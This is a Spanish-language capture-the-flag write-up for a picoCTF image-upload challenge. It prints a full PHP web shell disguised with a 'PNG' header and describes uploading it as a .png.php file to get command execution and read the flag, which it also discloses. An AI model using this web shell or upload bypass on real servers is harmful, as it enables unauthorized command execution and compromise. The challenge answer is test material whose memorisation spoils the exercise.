## Description
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:53778/)!

## Solución
![[Pasted image 20241002000405.png]]
![[Pasted image 20241002000507.png]]
![[Pasted image 20241002000529.png]]
![[Pasted image 20241002000619.png]]

```txt
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
![[Pasted image 20241002001243.png]]
![[Pasted image 20241002001315.png]]
![[Pasted image 20241002001359.png]]
![[Pasted image 20241002001452.png]]
![[Pasted image 20241002001501.png]]
## Bandera
```css
flag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}
```
## Notas Adicionales
Abrimos la página y nos pide subir una foto en formato *PNG* cuando la subimos, vemos que no hace nada la página. Revisamos el archivo ``robots.txt`` para ver qué otras pistas nos pueden servir.  Tendremos que crear un archivo de texto que contenga los caracteres ``PNG`` al principio para que lo interprete como PNG y además este llevará el código de este repositorio de git: [repo](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985) Tendremos que guardar ese archivo con la siguiente extensión: `nombrearchivo.png.php` y subirlo así a la página. Posteriormente hay que entrar a la carpeta de `/uploads/nombrearchivo.png.php` Eso nos abrirá una terminal y tendremos que analizar los archivos de esta. Observaremos un archivo llamativo. Lo concatenaremos para ver su contenido y obtenemos la bandera.
# comandos utilizados

## Referencias
[GitRepo](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)